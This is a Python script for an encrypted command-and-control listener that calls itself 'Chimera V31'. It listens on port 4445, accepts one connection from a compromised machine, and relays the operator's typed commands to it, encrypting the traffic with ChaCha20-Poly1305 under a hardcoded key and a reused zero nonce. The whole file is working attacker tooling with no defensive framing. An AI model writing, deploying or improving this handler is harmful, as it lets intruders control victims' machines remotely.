#!/usr/bin/env python3
import socket, threading, sys, os
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

CHIMERA_KEY = bytes([
    0x43, 0x48, 0x49, 0x4d, 0x45, 0x52, 0x41, 0x5f, 0x50, 0x52, 0x4f, 0x4a, 0x45, 0x43, 0x54, 0x5f, 
    0x32, 0x30, 0x32, 0x36, 0x5f, 0x53, 0x45, 0x43, 0x52, 0x45, 0x54, 0x5f, 0x4b, 0x45, 0x59, 0x21
])
crypto = ChaCha20Poly1305(CHIMERA_KEY)
iv = bytes([0] * 12)

def handle_recv(conn):
    while True:
        try:
            data = conn.recv(4096)
            if not data: break
            decrypted = crypto.decrypt(iv, data, None)
            sys.stdout.buffer.write(decrypted)
            sys.stdout.buffer.flush()
        except Exception:
            break
    print("\n[!] Secured link severed.")
    os.system("stty sane")
    os._exit(0)

print("[+] Chimera V31: Encrypted C2 Active (Port 4445)")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4445))
s.listen(1)

conn, addr = s.accept()
print(f"[!] Secure connection established from {addr[0]}")

threading.Thread(target=handle_recv, args=(conn,), daemon=True).start()

try:
    while True:
        cmd = sys.stdin.buffer.read1(1024)
        if not cmd: break
        encrypted = crypto.encrypt(iv, cmd, None)
        conn.sendall(encrypted)
finally:
    os.system("stty sane")
